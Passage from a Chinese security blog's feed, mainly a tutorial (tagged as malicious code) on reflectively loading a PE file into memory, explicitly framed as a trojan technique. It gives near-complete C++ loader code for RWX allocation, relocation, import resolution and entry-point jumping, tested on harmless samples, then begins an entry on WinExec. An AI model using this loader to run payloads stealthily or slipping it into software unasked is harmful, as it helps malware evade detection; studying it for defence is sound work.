    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>自启动技术-内存直接加载运行</title>
    <link href="https://b1ack1e.github.io/2021/07/15/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/"/>
    <id>https://b1ack1e.github.io/2021/07/15/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/</id>
    <published>2021-07-15T06:28:21.000Z</published>
    <updated>2021-07-27T08:46:45.018Z</updated>
    
    <content type="html"><![CDATA[<h4 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a>内存直接加载运行</h4><p>内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>打开文件并且获取大小</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* FileName = <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestDll.dll&quot;</span>;</span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(FileName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_ARCHIVE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//获取大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//申请内存空间</span></span><br><span class="line">PBYTE pData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//将文件读取到内存中</span></span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pData, dwFileSize, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br></pre></td></tr></table></figure><h5 id="获取sizeofimage"><a href="#获取sizeofimage" class="headerlink" title="获取sizeofimage"></a>获取sizeofimage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取PE文件的镜像大小，获取加载到内存后的大小</span></span><br><span class="line"><span class="comment">* lpData内存中的基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetImageSize</span><span class="params">(LPVOID lpData)</span> </span>&#123;</span><br><span class="line">DWORD dwSizeOfImage = <span class="number">0</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"><span class="keyword">return</span> dwSizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LPVOID lpBaseAddr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(lpBaseAddr, dwImageSize);</span><br></pre></td></tr></table></figure><h5 id="重定位数据"><a href="#重定位数据" class="headerlink" title="重定位数据"></a>重定位数据</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取重定位表的相关数据并且重定位数据</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">DoRelocationTable</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取重定位表</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pDosHeader +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="keyword">if</span> ((PVOID)pReloc == (PVOID)pDosHeader) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开始扫描重定位表</span></span><br><span class="line"><span class="keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始</span></span><br><span class="line">WORD* pRelocData = (WORD*)((PBYTE)pReloc + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//获取需要重定位的数据的个数</span></span><br><span class="line"><span class="keyword">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nNumberOfReloc; i++) &#123;</span><br><span class="line">            <span class="comment">//高位是否为3，判断是否需要修复</span></span><br><span class="line"><span class="keyword">if</span> ((DWORD)(pRelocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) &#123; </span><br><span class="line"><span class="comment">//获取需要重定位数据的地址</span></span><br><span class="line">DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line"><span class="comment">//修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值</span></span><br><span class="line">DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">*pAddress += dwDelta;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继续处理下一组重定位数据</span></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取导入表的相关数据</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">DoImportTable</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取导入表地址</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="comment">// 循环遍历导入表中的DLL及获取导入表中的函数地址</span></span><br><span class="line"><span class="keyword">char</span>* lpDllName = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == pImportTable-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取导入表中DLL的名称并加载DLL</span></span><br><span class="line">lpDllName = (<span class="keyword">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);</span><br><span class="line">hDll = <span class="built_in">GetModuleHandleA</span>(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll) &#123;</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll) &#123;</span><br><span class="line">pImportTable++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line"><span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == lpImportNameArray[i].u1.AddressOfData) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);</span><br><span class="line"><span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal) &#123;</span><br><span class="line"><span class="comment">// 序号导出</span></span><br><span class="line"><span class="comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span></span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 名称导出</span></span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line">lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改ImageBase</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetImage</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h5><p>如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Entry</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax,Entry</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1ackie!!!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序查看效果，可以看到直接加载运行TestProcess.exe。</p><p><img src="/2021/07/15/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/1.png"></p><p>若是DLL文件，还需要构造一下DLLMAIN</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CallDllMain</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">typedef_DllMain DllMain = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">BOOL bRet = <span class="built_in">DllMain</span>((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (bRet == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;构造入口点失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取导出函数及其地址</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">* lpszFuncName：导出函数名字</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">LPVOID <span class="title">GetExFuncAddr</span><span class="params">(LPVOID lpBaseAddr,<span class="keyword">char</span>* lpszFuncName)</span> </span>&#123;</span><br><span class="line">LPVOID lpFunc = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取导出表地址</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + </span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"><span class="comment">//从导出表取出的函数名</span></span><br><span class="line"><span class="keyword">char</span>* lpFuncName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取AddressOfNames</span></span><br><span class="line">PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);</span><br><span class="line"><span class="comment">//获取AddressOfNameOrdinals</span></span><br><span class="line">PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">//索引值</span></span><br><span class="line">WORD wHint = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取AddressOfFunctions</span></span><br><span class="line">PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);</span><br><span class="line"><span class="comment">//获取所有根据名称导出的函数数量</span></span><br><span class="line">DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++) &#123;</span><br><span class="line">lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);</span><br><span class="line"><span class="keyword">if</span> (strcmpi(lpFuncName, lpszFuncName) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//获取索引值</span></span><br><span class="line">wHint = lpAddressOfNameOrdinalArray[i];</span><br><span class="line"><span class="comment">//根据索引值，在AddressOfFunctions中取出RVA</span></span><br><span class="line">lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回函数地址</span></span><br><span class="line"><span class="keyword">return</span> lpFunc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。</p><p><img src="/2021/07/15/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;内存直接加载运行&quot;&gt;&lt;a href=&quot;#内存直接加载运行&quot; class=&quot;headerlink&quot; title=&quot;内存直接加载运行&quot;&gt;&lt;/a&gt;内存直接加载运行&lt;/h4&gt;&lt;p&gt;内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="启动技术" scheme="https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
    <category term="PE" scheme="https://b1ack1e.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>启动技术-创建进程API</title>
    <link href="https://b1ack1e.github.io/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/"/>
    <id>https://b1ack1e.github.io/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/</id>
    <published>2021-07-14T07:15:24.000Z</published>
    <updated>2021-07-27T08:45:58.648Z</updated>
    
    <content type="html"><![CDATA[<h4 id="创建进程API"><a href="#创建进程API" class="headerlink" title="创建进程API"></a>创建进程API</h4><p>在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。</p><h4 id="具体实现及函数介绍"><a href="#具体实现及函数介绍" class="headerlink" title="具体实现及函数介绍"></a>具体实现及函数介绍</h4><h5 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h5><p>运行指定的应用程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT WinExec(</span><br><span class="line">  LPCSTR lpCmdLine,</span><br><span class="line">  UINT   uCmdShow</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件：</p><ol><li>应用程序加载的目录</li><li>当前目录</li><li>Windows系统目录。GetSystemDirectory函数检索此目录的路径。</li><li>Windows目录。GetWindowsDirectory函数检索此目录的路径。</li><li>PATH环节变量中列出的目录</li></ol><p>uCmdShow：显示选项，具体内容如下表：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE<BR>0</BR></td><td>隐藏窗口并激活另一个窗口</td></tr><tr><td>SW_SHOWNORMAL<BR>SW_NORMAL<BR>1</BR></BR></td><td>激活并显示一个窗口</td></tr><tr><td>SW_SHOWMINIMIZED<BR>2</BR></td><td>激活窗口并将其显示为最小化的窗口</td></tr><tr><td>SW_SHOWMAXIMIZED<br>SW_MAXIMIZE<br>3</td><td>激活窗口并将其显示为最大化窗口</td></tr><tr><td>SW_SHOWNOACTIVATE<br>4</td><td>以最近的大小和位置显示窗口</td></tr><tr><td>SW_SHOW<br>5</td><td>激活窗口并以其当前大小和位置显示它</td></tr><tr><td>SW_MINIMIZE<br>6</td><td>最小化指定的窗口并激活Z顺序中的下一个顶级窗口</td></tr><tr><td>SW_SHOWMINNOACTIVE<br>7</td><td>将窗口显示为最小化窗口</td></tr><tr><td>SW_SHOWNA<br>8</td><td>以当前大小和位置显示窗口</td></tr><tr><td>SW_RESTORE<br>9</td><td>激活并显示窗口</td></tr><tr><td>SW_SHOWDEFAULT<br>10</td><td>根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。</td></tr><tr><td>SW_FORCEMINIMIZE<br>11</td><td>最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。</td></tr></tbody></table><p>返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>系统内存或资源不足</td></tr><tr><td>ERROR_BAD_FORMAT</td><td>exe文件无效</td></tr><tr><td>ERROR_FILE_NOT_FOUND</td><td>找不到指定文件</td></tr><tr><td>ERROR_PATH_NOT_FOUND</